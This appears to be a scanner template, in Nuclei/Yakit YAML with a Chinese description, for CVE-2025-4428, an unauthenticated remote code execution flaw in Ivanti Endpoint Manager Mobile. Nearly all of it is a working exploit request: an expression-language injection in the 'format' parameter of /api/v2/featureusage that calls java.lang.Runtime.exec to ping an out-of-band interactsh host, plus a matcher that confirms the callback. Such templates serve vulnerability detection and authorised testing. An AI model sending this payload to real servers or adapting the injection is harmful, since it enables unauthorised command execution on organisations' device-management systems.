script_name: Ivanti EPMM 未授权远程代码执行漏洞
content:
id: CVE-2025-4428

info:
  name: Ivanti EPMM 未授权远程代码执行漏洞
  author: Deans
  severity: high
  description: 漏洞是由于Ivanti Endpoint Manager Mobile的API组件未能正确验证输入的数据而造成的漏洞。攻击者可以利用漏洞绕过身份认证，并通过受影响的API执行任何代码，对系统安全造成严重损害。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 2df81df84e5abcec2c15d761dd054fcb

http:
- raw:
  - |+
    @timeout: 30s
    GET /api/v2/featureusage?adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('ping%20{{interactsh-url}}')%7d HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: dsl
    part: body
    dsl:
    - interactsh_protocol
    condition: and
